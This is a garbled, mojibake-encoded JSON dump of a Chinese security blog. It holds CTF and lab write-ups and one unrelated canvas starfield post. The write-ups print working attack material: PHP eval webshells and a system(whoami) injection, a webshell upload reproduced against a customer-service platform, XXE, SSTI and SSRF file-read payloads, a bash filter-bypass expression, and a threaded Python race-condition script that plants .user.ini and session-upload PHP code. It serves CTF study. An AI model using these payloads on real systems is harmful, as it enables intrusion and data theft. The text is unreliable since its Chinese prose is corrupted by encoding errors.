#å¯èƒ½æ˜¯ç¯å¢ƒä¸å¯¹ï¼Œæˆ‘è¿™é‡Œæ²¡æœ‰\næ­¥éª¤ä¹\n9.ç»“åˆç›¸å…³åˆè§„çŸ¥è¯†ï¼Œæäº¤ç›¸å…³ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬\nroot@dengbap:/# uname -r\r5.15.0-112-generic ç­”æ¡ˆï¼šflag{5.15.0-112-generic}\næ­¥éª¤å\n10.å¯¹å¼€å¯çš„ç«¯å£æ’æŸ¥ï¼Œç»“åˆåº”æ€¥å“åº”çŸ¥è¯†ï¼Œå¯¹å¼€æ”¾çš„ç›¸å…³æ¶æ„ç«¯å£è¿›è¡Œæäº¤\nroot@dengbap:/# netstat -tuln\rActive Internet connections (only servers)\rProto Recv-Q Send-Q Local Address Foreign Address State\rtcp 0 0 0.0.0.0:5566 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:6379 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:41089 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:17221 0.0.0.0:* LISTEN\rtcp 0 0 0.0.0.0:8090 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:17380 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:15329 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:17400 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:11211 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:17131 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:17033 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:15640 0.0.0.0:* LISTEN\rtcp 0 0 0.0.0.0:33060 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:5538 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:15445 0.0.0.0:* LISTEN\rtcp 0 0 0.0.0.0:12345 0.0.0.0:* LISTEN\rtcp 0 0 127.0.0.1:15538 0.0.0.0:* LISTEN\rtcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN\rtcp 0 0 0.0.0.0:9080 0.0.0.0:* LISTEN\rtcp 0 0 0.0.0.0:8899 0.0.0.0:* LISTEN\rtcp 0 0 0.0.0.0:8848 0.0.0.0:* LISTEN\rtcp6 0 0 :::3306 :::* LISTEN\rtcp6 0 0 ::1:6379 :::* LISTEN\rtcp6 0 0 :::33060 :::* LISTEN\rtcp6 0 0 :::22 :::* LISTEN\rtcp6 0 0 :::8848 :::* LISTEN\rudp 0 0 127.0.0.53:53 0.0.0.0:*\rudp 0 0 10.0.10.1:68 0.0.0.0:* è¿›å…¥æœåŠ¡å™¨ä¸­çš„å°çš®é¢æ¿çœ‹çœ‹å‘¢\nåœ¨ç«™ç‚¹å‘ç°å¯ç–‘ç›®å½•ï¼Œå¹¶ä¸”å¯¹åº”çš„å°±æ˜¯5566è¿™ä¸ªç«¯å£\nåœ¨ç›®å½•ä¸­å‘ç°è¿™ä¸ªæœ¨é©¬\nç­”æ¡ˆï¼šflag{5566}\næ­¥éª¤åä¸€ #\r11.å·²çŸ¥ç›¸åº”çš„WEBæ¶æ„ç«¯å£ï¼Œæäº¤å…¶éšè—æ–‡ä»¶ä¸­flag\nåœ¨ä¸Šå›¾ä¸­çš„hacker.phpä¸­æœ‰\n\u0026lt;?php eval($_POST[\u0026#39;7815696ecbf1c96e6894b779456d330e\u0026#39;]); ?\u0026gt; ç­”æ¡ˆï¼šflag{7815696ecbf1c96e6894b779456d330e}\næ­¥éª¤åäºŒ #\r12.ç»“åˆç›¸å…³çŸ¥è¯†ï¼Œæäº¤MySQLå­˜åœ¨ç©ºå£ä»¤é£é™©çš„ç”¨æˆ·åï¼Œå¤šä¸ªç”¨æˆ·åå·²+è¿æ¥\næˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯æ•°æ®åº“è¿æ¥å·¥å…·datagripï¼Œå¯ä»¥ç›´æ¥æ‰“å¼€mysqlæ•°æ®åº“ä¸­çš„userè¡¨ï¼ŒæŸ¥çœ‹authenticationå­—æ®µä¸ºç©ºçš„ç”¨æˆ·å³å¯ï¼Œæˆ–è€…ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤\nselect User,authentication_string from mysql.user; å¯ä»¥çœ‹åˆ°yunweiæ˜¯æ²¡æœ‰å¯†ç çš„\nç­”æ¡ˆï¼šflag{yunwei}\næ­¥éª¤åä¸‰ #\r13.ç»“åˆç›¸å…³çŸ¥è¯†ï¼Œå¯¹MySQLå¯†ç å¤æ‚åº¦æŸ¥è¯¢åˆ°çš„æœ€å°é•¿åº¦è¿›è¡Œæäº¤\nSHOW VARIABLES LIKE \u0026#39;validate_password%\u0026#39;;\r#æŸ¥åˆ°validate_password.lengthçš„å€¼ä¸º8 ç­”æ¡ˆï¼šflag{8}\næ­¥éª¤åå›› #\r14.ç»“åˆç›¸å…³çŸ¥è¯†ï¼Œå¯¹MySQLç™»å½•æœ€å¤§å¤±è´¥æ¬¡æ•°æŸ¥è¯¢å¹¶æäº¤\nshow variables like \u0026#39;%connection_control%\u0026#39;;\r#connection_control_failed_connections_threshold 3 ç­”æ¡ˆï¼šflag{3}\næ­¥éª¤åäº” #\r15.ç»“åˆç›¸å…³çŸ¥è¯†ï¼Œå¯¹MySQLè¶…æ—¶è¿”å›æœ€å¤§æ—¶å¸¸è¿›è¡Œæäº¤(ç§’ä¸ºå•ä½)\nSHOW VARIABLES LIKE \u0026#39;wait_timeout\u0026#39;; #28800 ç­”æ¡ˆï¼šflag{28800}\næ­¥éª¤åå…­ #\r16.ç»“åˆç›¸å…³çŸ¥è¯†ï¼Œå¯¹MySQLé”å®šç”¨æˆ·æ•°é‡è¿›è¡Œæäº¤\nSELECT COUNT(*) FROM mysql.user WHERE account_locked = \u0026#39;Y\u0026#39;; # 3 ç­”æ¡ˆï¼šflag{3}\næ­¥éª¤åä¸ƒ #\r17.æäº¤MySQLå…¨å±€æ—¥å¿—çŠ¶æ€ OFFæˆ–ON\nSHOW VARIABLES LIKE \u0026#39;general_log\u0026#39;; # OFF ç­”æ¡ˆï¼šflag{OFF}\næ­¥éª¤åå…« #\r18.æäº¤å½“å‰MySQLæ•°æ®åº“ç‰ˆæœ¬\nselect version(); #8.0.27 ç­”æ¡ˆï¼šflag{8.0.27}\næ­¥éª¤åä¹ #\r19.ä½¿ç”¨/root/fscan/fscanå¯¹æœ¬åœ°è¿›è¡Œæ‰«æï¼Œå¯¹å­˜åœ¨æ¼æ´çš„ç«¯å£è¿›è¡Œæäº¤ï¼Œå¤šä¸ªç«¯å£ä»¥+è¿æ¥\n123456æ˜¯redisçš„å¼±å¯†ç \nç­”æ¡ˆï¼šflag{6379+8848}\næ­¥éª¤äºŒå #\r20.æ ¹æ®æ‰¾åˆ°å…¶ä¸­çš„ä¸€ä¸ªåº”ç”¨æœåŠ¡æ¼æ´ï¼Œæäº¤æ•°æ®ä¸­çš„flag\nä¸Šä¸€ä¸ªæ­¥éª¤é‡Œçš„8848ç«¯å£å­˜åœ¨nacosæƒé™ç»•è¿‡\næŠ“åˆ°ç™»é™†åŒ…ï¼Œä¿®æ”¹å¦‚å›¾ï¼Œå¯ä»¥åˆ›å»ºç”¨æˆ·\nåœ¨åå°æ‹¿åˆ°flag\nç­”æ¡ˆï¼šflag{636ce4dc544036142a8e05a686b5c27e}\næ­¥éª¤äºŒåä¸€ #\r20.æ ¹æ®æ­å»ºæœåŠ¡ç«¯å£12345è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œæäº¤å‘½ä»¤æ‰§è¡Œçš„whoamiå›æ˜¾åŒ…\nç½‘ç«™åº”è¯¥è¿˜æ˜¯ç”¨thinkphpæ­å»ºçš„\nè¿™é‡Œå¯ä»¥ä½¿ç”¨ç°æˆçš„æ¡†æ¶å·¥å…·æ¥æ¸—é€ï¼Œä¸è¿‡æ²¡æœ‰èƒ½ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„poc\næ¥åˆ°åå°æ·»åŠ æ–‡ç« ï¼Œæ¯ä¸ªç‚¹éƒ½å°è¯•ä¸€ä¸‹\n\u003c?php system(whoami);?\u003eè½¬ä¹‰åæ›¿æ¢åˆ°infoé‡Œï¼Œå‘åŒ…å°±è¡Œ\ræœ€åè®¿é—®æ–‡ç« ï¼ŒæŠŠæ–‡ç« åç¼€çš„htmlæ”¹ä¸ºphpï¼Œå³å¯å¾—åˆ°æƒé™ä¸ºwww\nç­”æ¡ˆï¼šflag{www}\n","date":"2024-07-06","externalUrl":null,"permalink":"/posts/2024/07/linux-graded-protection-assessment/","section":"Posts","summary":"","title":"ç­‰ä¿-Linuxç­‰ä¿æµ‹è¯„","type":"posts"},{"content":"","date":"2024-07-06","externalUrl":null,"permalink":"/tags/%E7%AD%89%E4%BF%9D%E6%B5%8B%E8%AF%84/","section":"Tags","summary":"","title":"ç­‰ä¿æµ‹è¯„","type":"tags"},{"content":"","date":"2024-06-15","externalUrl":null,"permalink":"/categories/vulnerability-review/","section":"Categories","summary":"","title":"Vulnerability-Review","type":"categories"},{"content":"ç¯å¢ƒï¼šææ ¸::CTF (get-shell.com)\nè¿›å…¥å¹³å°ä¸»é¡µï¼Œç‚¹å‡»å…è´¹ä½¿ç”¨ï¼Œæ³¨å†Œè´¦å·ï¼Œç™»å…¥åå°\nåœ¨å·¦ä¾§çš„å¹¿å‘Šè®¾ç½®ä¸€æ ä¸­ï¼Œå­˜åœ¨å›¾ç‰‡ä¸Šä¼ çš„ç‚¹\nè¿™é‡Œå¯ä»¥å…ˆéšæ„ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡ï¼ˆè¦å…ˆæ‰“å¼€burp suiteçš„æ‹¦æˆªï¼Œåœ¨ç‚¹å‡»ä¸Šä¼ \nå¯ä»¥çœ‹åˆ°æ‹¦æˆªä¸‹æ¥çš„åŒ…æ˜¯è¿™æ ·çš„ï¼Œå›¾ç‰‡æ˜¯å†…å®¹è¿›è¡Œäº†base64åŠ è§£å¯†å¤„ç†\næŠŠä¸€å¥è¯æœ¨é©¬è¿›è¡Œbase64åŠ å¯†ï¼Œå¹¶ä¸”æ›¿æ¢æ‰åŸæ¥base64åé¢çš„ä¸€é•¿ä¸²ï¼Œä¿®æ”¹æ–‡ä»¶ç±»å‹ä¸ºphp\nè½¬åˆ°repeaterï¼Œå‘åŒ…ï¼Œå¾—åˆ°å›æ˜¾è·¯å¾„\nç›´æ¥ç”¨èšå‰‘è¿æ¥ï¼Œæ‹¿åˆ°shell\n","date":"2024-06-15","externalUrl":null,"permalink":"/posts/2024/06/vulnerability-reproduction-dome-customer-service-platform/","section":"Posts","summary":"","title":"æœµç±³å®¢æœå¹³å°","type":"posts"},{"content":"","date":"2024-06-15","externalUrl":null,"permalink":"/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","section":"Tags","summary":"","title":"æ¼æ´å¤ç°","type":"tags"},{"content":"","date":"2024-06-15","externalUrl":null,"permalink":"/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","section":"Tags","summary":"","title":"æ–‡ä»¶ä¸Šä¼ ","type":"tags"},{"content":"","date":"2024-06-02","externalUrl":null,"permalink":"/categories/web-front-end/","section":"Categories","summary":"","title":"Web-Front-End","type":"categories"},{"content":"æœ¬ç«™ä½¿ç”¨çš„æ˜Ÿç©ºèƒŒæ™¯ç‰¹æ•ˆæ˜¯ç”¨html5 canvasç»˜åˆ¶è€Œæˆ\nåœ¨Argonä¸»é¢˜è®¾ç½®èƒŒæ™¯å›¾ç‰‡çš„ä»£ç é‡Œå¯ä»¥çœ‹åˆ°ï¼ŒèƒŒæ™¯å›¾å±‚çš„z-indexæ˜¯-2\nè¿™é‡Œåªéœ€è¦æ·»åŠ ä¸€ä¸ªcanvasç”»å¸ƒï¼ŒæŠŠz-indexæŠ¬é«˜ä¸€ç‚¹ï¼Œå³å¯è¦†ç›–\næ‰“å¼€wordpressæ§åˆ¶å°â†’ä¸»é¢˜æ–‡ä»¶ç¼–è¾‘å™¨â†’footer.phpï¼Œæ‰¾åˆ°å¦‚å›¾æ‰€ç¤ºä½ç½®\næ·»åŠ ä»£ç å¦‚ä¸‹æ‰€ç¤º\n\u0026lt;?php echo get_option(\u0026#39;argon_custom_html_foot\u0026#39;); ?\u0026gt;\r//ä»ä¸‹é¢å¼€å§‹\r\u0026lt;canvas id=\u0026#34;canvas\u0026#34; style=\u0026#34;z-index: -1;left: 0;\rright: 0;\rtop: 0;\rbottom: 0;position: fixed;\u0026#34;\u0026gt;\r\u0026lt;/canvas\u0026gt;\r\u0026lt;script\u0026gt;\rvar canvas = document.getElementById(\u0026#39;canvas\u0026#39;),\rctx = canvas.getContext(\u0026#39;2d\u0026#39;),\rw = canvas.width = window.innerWidth,\rh = canvas.height = window.innerHeight,\rhue = 217,\rstars = [],\rcount = 0,\rmaxStars = 800; // è°ƒæ•´æ˜Ÿæ˜Ÿæ•°é‡\rvar canvas2 = document.createElement(\u0026#39;canvas\u0026#39;),\rctx2 = canvas2.getContext(\u0026#39;2d\u0026#39;);\rcanvas2.width = 100;\rcanvas2.height = 100;\rvar half = canvas2.width / 2,\rgradient2 = ctx2.createRadialGradient(half, half, 0, half, half, half);\rgradient2.addColorStop(0.025, \u0026#39;#CCC\u0026#39;);\rgradient2.addColorStop(0.1, \u0026#39;hsl(\u0026#39; + hue + \u0026#39;, 61%, 33%)\u0026#39;);\rgradient2.addColorStop(0.25, \u0026#39;hsl(\u0026#39; + hue + \u0026#39;, 64%, 6%)\u0026#39;);\rgradient2.addColorStop(1, \u0026#39;transparent\u0026#39;);\rctx2.fillStyle = gradient2;\rctx2.beginPath();\rctx2.arc(half, half, half, 0, Math.PI * 2);\rctx2.fill();\rfunction random(min, max) {\rif (arguments.length \u0026lt; 2) {\rmax = min;\rmin = 0;\r}\rif (min \u0026gt; max) {\rvar hold = max;\rmax = min;\rmin = hold;\r}\rreturn Math.floor(Math.random() * (max - min + 1)) + min;\r}\rfunction maxOrbit(x, y) {\rvar max = Math.max(x, y),\rdiameter = Math.round(Math.sqrt(max * max + max * max));\rreturn diameter / 2;\r}\rvar Star = function() {\rthis.orbitRadius = random(maxOrbit(w, h));\rthis.radius = random(60, this.orbitRadius) / 8;\rthis.orbitX = w / 2;\rthis.orbitY = h / 2;\rthis.timePassed = random(0, maxStars);\rthis.speed = random(this.orbitRadius) / 300000;\rthis.alpha = random(2, 10) / 10;\rcount++;\rstars[count] = this;\r}\rStar.prototype.draw = function() {\rvar x = Math.sin(this.timePassed) * this.orbitRadius + this.orbitX,\ry = Math.cos(this.timePassed) * this.orbitRadius + this.orbitY,\rtwinkle = random(10);\rif (twinkle === 1 \u0026amp;\u0026amp; this.alpha \u0026gt; 0) {\rthis.alpha -= 0.05;\r} else if (twinkle === 2 \u0026amp;\u0026amp; this.alpha \u0026lt; 1) {\rthis.alpha += 0.05;\r}\rctx.globalAlpha = this.alpha;\rctx.drawImage(canvas2, x - this.radius / 2, y - this.radius / 2, this.radius, this.radius);\rthis.timePassed += this.speed;\r}\rfor (var i = 0; i \u0026lt; maxStars; i++) {\rnew Star();\r}\rfunction animation() {\rctx.globalCompositeOperation = \u0026#39;source-over\u0026#39;;\rctx.globalAlpha = 0.5; // å°¾å·´æ•ˆæœ\rctx.fillStyle = \u0026#39;hsla(\u0026#39; + hue + \u0026#39;, 64%, 6%, 2)\u0026#39;;\rctx.fillRect(0, 0, w, h);\rctx.globalCompositeOperation = \u0026#39;lighter\u0026#39;;\rfor (var i = 1, l = stars.length; i \u0026lt; l; i++) {\rstars[i].draw();\r};\rwindow.requestAnimationFrame(animation);\r}\ranimation();\rwindow.addEventListener(\u0026#39;resize\u0026#39;, () =\u0026gt; {\rw = canvas.width = window.innerWidth;\rh = canvas.height = window.innerHeight;\rstars = [];\rcount = 0;\rfor (var i = 0; i \u0026lt; maxStars; i++) {\rnew Star();\r}\r});\r\u0026lt;/script\u0026gt;//åˆ°è¿™é‡Œç»“æŸ\r\u0026lt;/html\u0026gt; å› ä¸ºè¿™æ˜¯h5çš„ç‰¹æ€§ï¼Œä¸€èˆ¬æ¥è¯´åªè¦ä¸æ˜¯è€æ—§çš„æµè§ˆå™¨ï¼Œéƒ½èƒ½æ­£å¸¸æ˜¾ç¤ºå‡ºcanvas\nä¼šé€ æˆå¾ˆå°æ€§èƒ½æŸå¤±\n","date":"2024-06-02","externalUrl":null,"permalink":"/posts/2024/06/background-starry-sky-visual-effects/","section":"Posts","summary":"","title":"èƒŒæ™¯æ˜Ÿç©ºç‰¹æ•ˆ","type":"posts"},{"content":"","date":"2024-06-02","externalUrl":null,"permalink":"/tags/%E5%89%8D%E7%AB%AF/","section":"Tags","summary":"","title":"å‰ç«¯","type":"tags"},{"content":"\rWEB #\rexx #\rè¿™ä¸ªæ ‡é¢˜ä»¥åŠæ•´ä¸ªç•Œé¢ï¼Œåœ¨NSSé‡Œé¢æ˜¯åšåˆ°è¿‡åŸé¢˜çš„ï¼Œæ•´ä½“æ€è·¯å°±æ˜¯XXE\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; ?\u0026gt;\r\u0026lt;!DOCTYPE note [\r\u0026lt;!ENTITY hyh SYSTEM \u0026#34;file:///flag\u0026#34;\u0026gt;\r]\u0026gt;\r\u0026lt;user\u0026gt;\r\u0026lt;username\u0026gt;\u0026amp;hyh;\u0026lt;/username\u0026gt;\r\u0026lt;password\u0026gt;123456\u0026lt;/password\u0026gt;\r\u0026lt;/user\u0026gt; ç„¶åå‘åŒ…å³å¯\nSAS - Serializing Authentication System #\rbase64åŠ å¯†ä¹‹åä¼ å…¥å‚æ•°å³å¯\n\u0026lt;?php\rclass User {\rpublic $username;\rpublic $password;\rfunction __construct($username, $password) {\r$this-\u0026gt;username = $username;\r$this-\u0026gt;password = $password;\r}\rfunction isValid() { return $this-\u0026gt;username === \u0026#39;admin\u0026#39; \u0026amp;\u0026amp; $this-\u0026gt;password === \u0026#39;secure_password\u0026#39;; }\r}\r$a=new User(\u0026#39;admin\u0026#39;,\u0026#39;secure_password\u0026#39;);\recho base64_encode(serialize($a)); ä¸€ä¸ª\u0026hellip;.æ± å­ï¼Ÿ #\rèƒ½å¤Ÿå›æ˜¾2\nå¯ä»¥çœ‹å‡ºè€ƒå¯ŸSSTIæ¨¡æ¿æ³¨å…¥\n{{lipsum.__globals__.__getitem__(\u0026#39;os\u0026#39;).popen(\u0026#39;cat /f*\u0026#39;).read()}} #ç›´æ¥æ‰“é€š æµè§ˆå™¨ä¹Ÿèƒ½å¥—å¨ƒï¼Ÿ #\rè¿™é“é¢˜è™½ç„¶å­˜åœ¨XSSæ¼æ´ï¼Œä½†æ˜¯è€ƒç‚¹æ˜¯SSRFæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ \nä½¿ç”¨åè®®ç»•è¿‡\nfile:///flag.txt é«˜äº®ä¸»é¢˜(åˆ’æ‰)èƒŒæ™¯æŸ¥çœ‹å™¨ #\rä¸€çœ¼æ–‡ä»¶åŒ…å«ï¼Œä¸è¿‡éœ€è¦æŠ“åŒ…\nç™¾ä¸‡ç¾å…ƒçš„è¯±æƒ‘ #\r\u0026lt;?php\rerror_reporting(0);\r$a = $_GET[\u0026#39;a\u0026#39;];\r$b = $_GET[\u0026#39;b\u0026#39;];\r$c = $_GET[\u0026#39;c\u0026#39;];\rif ($a !== $b \u0026amp;\u0026amp; md5($a) == md5($b)) {\rif (!is_numeric($c) \u0026amp;\u0026amp; $c \u0026gt; 2024) {\recho \u0026#34;å¥½åº·çš„\u0026#34;;\r} else {\rdie(\u0026#34;å¹²å·´çˆ¹å¹²å·´çˆ¹å…ˆè¾ˆ~\u0026#34;);\r}\r}\relse {\rdie(\u0026#34;å¼€èƒƒå°èœ))\u0026#34;);\r}\rå¼€èƒƒå°èœ)) #?a[]=1\u0026amp;b[]=2\u0026amp;c=9999%20 ç»•è¿‡å¾—åˆ°./dollar.php\n//dollar.php\r\u0026lt;?php\r//flag in 12.php\rerror_reporting(0);\rif(isset($_GET[\u0026#39;x\u0026#39;])){\r$x = $_GET[\u0026#39;x\u0026#39;];\rif(!preg_match(\u0026#34;/[a-z0-9;`|#\u0026#39;\\\u0026#34;%\u0026amp;\\x09\\x0a\u0026gt;\u0026lt;.,?*\\-=\\\\[\\]]/i\u0026#34;, $x)){\rsystem(\u0026#34;cat \u0026#34;.$x.\u0026#34;.php\u0026#34;);\r}\r}else{\rhighlight_file(__FILE__);\r}\r?\u0026gt; ä¸Šé¢çš„æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤äº†ä»¥ä¸‹å‡ ç§æƒ…å†µ\nå°å†™å­—æ¯ a åˆ° zï¼ˆå¿½ç•¥å¤§å°å†™ï¼Œä½¿ç”¨ i ä¿®é¥°ç¬¦ï¼‰\næ•°å­— 0 åˆ° 9\nç‰¹æ®Šå­—ç¬¦ï¼š;ã€\\``ã€|ã€#ã€\u0026rsquo;ã€\u0026quot;ã€%ã€\u0026amp;ã€\\x09ï¼ˆåˆ¶è¡¨ç¬¦ï¼‰ã€\\x0aï¼ˆæ¢è¡Œç¬¦ï¼‰ã€\u0026gt;ã€\u0026lt;ã€.ã€ï¼Œã€?ã€*ã€-ã€=ã€[ã€]`\nè¿™é‡Œåªéœ€è¦æ„é€ å‡º1ã€2ä¸¤ä¸ªæ•°å­—å³å¯ï¼Œç”¨äº†ä¸€ç§å¾ˆæ–°çš„æ€è·¯\nå³å¯ä»¥ä½¿ç”¨$ã€ï¼ˆã€ï¼‰ï¼Œ~è¿™å››ä¸ªå­—ç¬¦è¿›è¡Œæ„é€ \n// x=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) ","date":"2024-06-01","externalUrl":null,"permalink":"/posts/2024/06/litctf-2024/","section":"Posts","summary":"","title":"LitCTF 2024","type":"posts"},{"content":"å‰è¨€ ï¼šç»ƒä¹ é¢˜ç›®ï¼Œåº·å¤è®­ç»ƒ\nåŸè°…4 #\r\u0026lt;?php isset($_GET[\u0026#39;xbx\u0026#39;])?system($_GET[\u0026#39;xbx\u0026#39;]):highlight_file(__FILE__); é¢˜ç›®ç»™äº†è¿™ä¸€æ®µä»£ç ï¼Œä½†æ˜¯ç»è¿‡æµ‹è¯•ï¼Œåªæœ‰lsã€rmã€shè¿™ä¸‰ä¸ªå‘½ä»¤èƒ½ç”¨\nflagåœ¨æ ¹ç›®å½•ï¼Œæ²¡æœ‰ç›´æ¥è¯»å–æ–‡ä»¶çš„å‘½ä»¤\nä½†æ˜¯è¿™ä¸ªshå‘½ä»¤æ˜¯å¯ä»¥æ‰§è¡Œæ–‡ä»¶ä¸­çš„å‘½ä»¤çš„ï¼Œç±»ä¼¼äºä¸‹å›¾\nå½“æ–‡ä»¶ä¸­çš„å‘½ä»¤ä¸èƒ½è¢«æ­£å¸¸æ‰§è¡Œæ—¶å€™ï¼Œä¼šæŠ›å‡ºcommand not foundçš„é”™è¯¯\nå¯ä»¥ä½¿ç”¨linuxä¸­çš„é‡å®šå‘é”™è¯¯è¾“å‡ºï¼Œå…·ä½“å¯è§ä¸‹æ–‡\nä¸€ç¯‡æ–‡ç« çœ‹æ‡‚linuxçš„2\u0026gt;$1-CSDNåšå®¢ é‡å®šå‘ä¹‹åï¼Œé”™è¯¯è¾“å‡ºå°±å˜æˆäº†æ ‡å‡†è¾“å‡ºï¼Œæµè§ˆå™¨å¯ä»¥æ­£å¸¸æ˜¾ç¤ºï¼Œäºæ˜¯é¢„æœŸè§£å¦‚ä¸‹\nç”±äºåªæ˜¯é™åˆ¶äº†/binç›®å½•ä¸‹çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½†æ˜¯åœ¨å…¶ä»–ç›®å½•ä¸‹è¿˜å¯èƒ½å­˜åœ¨å…¶ä»–çš„å‘½ä»¤æ–‡ä»¶ï¼Œå°±å­˜åœ¨äº†éé¢„æœŸï¼Œæ¯”å¦‚è¯´åœ¨/usr/local/binä¸‹å­˜åœ¨phpæ–‡ä»¶ï¼Œå¯ä»¥ç”¨è¿™ä¸ª\nå°è¯•ç›´æ¥åŒ…å«/flag\nåŸè°…5_fastapi2 #\rfastapiå­˜åœ¨ä¸€ä¸ªdocsæ¥å£å¯ä»¥è¿›è¡Œäº¤äº’æ“ä½œ\né¢˜ç›®ç»™å‡ºæç¤ºè¿‡æ»¤\n[\u0026#39;import\u0026#39;, \u0026#39;open\u0026#39;, \u0026#39;eval\u0026#39;, \u0026#39;exec\u0026#39;, \u0026#39;class\u0026#39;, \u0026#39;\\\u0026#39;\u0026#39;, \u0026#39;\u0026#34;\u0026#39;, \u0026#39;vars\u0026#39;, \u0026#39;str\u0026#39;, \u0026#39;chr\u0026#39;] ä½¿ç”¨listæŸ¥çœ‹calcçš„å…¨å±€å˜é‡å¦‚ä¸‹\nåœ¨youdontknowé‡Œé¢å­˜åœ¨æœ‰è¿‡æ»¤çš„å•è¯å’Œå­—ç¬¦\nè¿™é‡Œå¯ä»¥å°è¯•æ¶ˆå»youdontknowé‡Œçš„æ‰€æœ‰å±æ€§\nä¼ å…¥youdontknow.clear()å‘½ä»¤ä¹‹åï¼Œå†è¿›è¡ŒlistæŸ¥çœ‹å…¨å±€å˜é‡ï¼Œå¯ä»¥å‘ç°wafè¢«è¦†ç›–äº†\næœ€åä½¿ç”¨open readæ–‡ä»¶æ“ä½œè¯»å–æ ¹ç›®å½•ä¸‹çš„flag\nåŸè°…6_web3 #\r\u0026lt;?php\rerror_reporting(0);\rhighlight_file(__FILE__);\rinclude(\u0026#39;waf.php\u0026#39;);\r$file = $_GET[\u0026#39;file\u0026#39;] ?? NULL;\r$content = $_POST[\u0026#39;content\u0026#39;] ?? NULL;\r(waf_file($file)\u0026amp;\u0026amp;waf_content($content))?(file_put_contents($file,$content)):NULL; å¯¹äºè¾“å…¥çš„æ–‡ä»¶å‚æ•°æœ‰è¿‡æ»¤ï¼Œè¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯ä¿®æ”¹.user.iniæ¥è¿›è¡Œsessionæ–‡ä»¶åŒ…å«\nä½†æ˜¯é»˜è®¤uploadclearupæ˜¯onï¼Œé‚£ä¹ˆä¸Šä¼ ä¹‹åå°±ä¼šç«‹å³æ¸…ç©ºï¼Œä¸è¿‡å­˜åœ¨æ¡ä»¶ç«äº‰å¯èƒ½æ€§\nåˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ· æ ¹æ®ä¸Šæ–‡ä¸­çš„è„šæœ¬è¿›è¡Œç®€å•ä¿®æ”¹\nimport io\rimport requests\rimport threading\rsessid = \u0026#39;hyh\u0026#39;\rurl=\u0026#39;http://518a31e6-f1c8-4991-ab71-8a1573952207.challenge.ctf.show/\u0026#39;\rdef write(session):\rwhile True:\rf = io.BytesIO(b\u0026#39;a\u0026#39; * 1024 * 50)\rresp = session.post( url, data={\u0026#39;PHP_SESSION_UPLOAD_PROGRESS\u0026#39;: \u0026#34;\u0026lt;?php system(\u0026#39;cat ./flag.php\u0026#39;);?\u0026gt;\u0026#34;}, files={\u0026#39;file\u0026#39;: (\u0026#39;hyh.txt\u0026#39;,f)}, cookies={\u0026#39;PHPSESSID\u0026#39;: sessid} )\rdef read(session):\rwhile True:\rresp = session.get(url + \u0026#34;index.php\u0026#34;)\rif \u0026#34;upload_progress\u0026#34; in resp.text:\rprint(resp.text)\rif __name__==\u0026#34;__main__\u0026#34;:\revent=threading.Event()\rwith requests.session() as session:\rhyh={\r\u0026#34;content\u0026#34;: \u0026#34;auto_prepend_file=/tmp/sess_\u0026#34; + sessid\r}//å…ˆå†™å…¥.user.iniæ–‡ä»¶\rsession.post(url + \u0026#34;?file=.user.ini\u0026#34;, data=hyh)\rfor i in range(1,30):\rthreading.Thread(target=write,args=(session,)).start()\rfor i in range(1,30):\rthreading.Thread(target=read,args=(session,)).start()\revent.set() è‡ªåŠ¨åŒ…å«sessæ–‡ä»¶ä¹‹åä¼šå¯¹æ‰€æœ‰æ–‡ä»¶ç”Ÿæ•ˆ,åŒæ—¶å†è®¿é—®index.phpæˆ–è€…waf.phpå³å¯çœ‹åˆ°è¢«åŒ…å«çš„flag\nfastapi2 for é˜¿ç‹¸ #\rè¿‡æ»¤åå•['import', 'open', 'eval', 'exec', 'class', '\\'', '\u0026quot;', 'vars', 'str', 'chr', '%', '_', 'flag','in', '-', 'mro', '[', ']']\né¢æ²¡ä»€ä¹ˆå¥½è¯´çš„,è·Ÿä¸Šé¢é‚£ä¸ªä¸€æ ·\n","date":"2024-03-23","externalUrl":null,"permalink":"/posts/2024/03/ctfshow-forgive-cup/","section":"Posts","summary":"","title":"CTFshow-åŸè°…æ¯","type":"posts"},{"content":"","date":"2023-12-05","externalUrl":null,"permalink":"/categories/pwn/","section":"Categories","summary":"","title":"Pwn","type":"categories"},{"content":"é¢˜ç›®æ¥æºäºNSSCTFç½‘ç«™\nret2text #\r[SWPUCTF 2021 æ–°ç”Ÿèµ›]gift_pwn 